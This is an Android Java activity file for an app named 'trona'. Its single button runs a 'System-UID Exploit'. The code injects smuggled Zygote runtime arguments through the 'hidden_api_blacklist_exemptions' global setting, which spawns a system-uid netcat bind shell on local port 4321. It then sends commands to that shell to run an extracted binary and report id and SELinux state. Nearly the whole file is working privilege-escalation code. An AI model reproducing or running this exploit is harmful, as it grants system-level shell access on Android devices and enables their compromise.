package com.example.trona;

import android.app.Activity;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private TextView outputView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        Button btnExploit = new Button(this);
        btnExploit.setText("Run System-UID Exploit");
        btnExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                runSystemExploit();
            }
        });
        layout.addView(btnExploit);

        outputView = new TextView(this);
        outputView.setText("Ready to escalate...\n");
        outputView.setTextIsSelectable(true);
        outputView.setTextColor(0xFF00FF00); // Terminal green
        outputView.setBackgroundColor(0xFF000000); // Black background
        outputView.setPadding(16, 16, 16, 16);

        ScrollView scroll = new ScrollView(this);
        scroll.addView(outputView);
        layout.addView(scroll);

        setContentView(layout);
    }

    private void log(String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                outputView.append(message + "\n");
            }
        });
    }

    private void runSystemExploit() {
        outputView.setText("");
        log("Triggering Zygote system-uid listener payload...");

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Extract trona binary so it's accessible by the system shell
                    File outFile = new File(getFilesDir(), "trona");
                    if (!outFile.exists()) {
                        InputStream in = getAssets().open("trona");
                        OutputStream out = new FileOutputStream(outFile);
                        byte[] buffer = new byte[1024];
                        int read;
                        while ((read = in.read(buffer)) != -1) {
                            out.write(buffer, 0, read);
                        }
                        in.close();
                        out.close();
                        log("Binary extracted.");
                    }
                    outFile.setExecutable(true, false);

                    // 1. Inject Zygote payload to spawn a system-uid (1000) netcat shell on port 4321
                    String exploitPayload = "LClass1;->method1( 10 --runtime-args --setuid=1000 --setgid=1000 --runtime-flags=2049 --mount-external-full --setgroups=3003 --nice-name=tronashell --seinfo=platform:targetSdkVersion=28:complete --invoke-with toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l; ";

                    Settings.Global.putString(
                        getContentResolver(),
                        "hidden_api_blacklist_exemptions",
                        exploitPayload
                    );
                    log("Payload injected. Waiting for system-uid listener to spin up...");
                    Thread.sleep(1500);

                    // Clean up setting immediately to prevent bootloops
                    Settings.Global.putString(
                        getContentResolver(),
                        "hidden_api_blacklist_exemptions",
                        ""
                    );
                    log("Settings cleaned up. Connecting to system-uid socket...");

                    // 2. Connect to the local system-uid port and execute our exploit/commands
                    ProcessBuilder pb = new ProcessBuilder("sh", "-c", "echo '" + outFile.getAbsolutePath() + " && id && getenforce' | toybox nc 127.0.0.1 4321");
                    pb.redirectErrorStream(true);
                    Process process = pb.start();

                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        log(line);
                    }

                    int exitCode = process.waitFor();
                    log("Execution finished with code: " + exitCode);

                } catch (Exception e) {
                    e.printStackTrace();
                    log("Error: " + e.getMessage());
                }
            }
        }).start();
    }
}
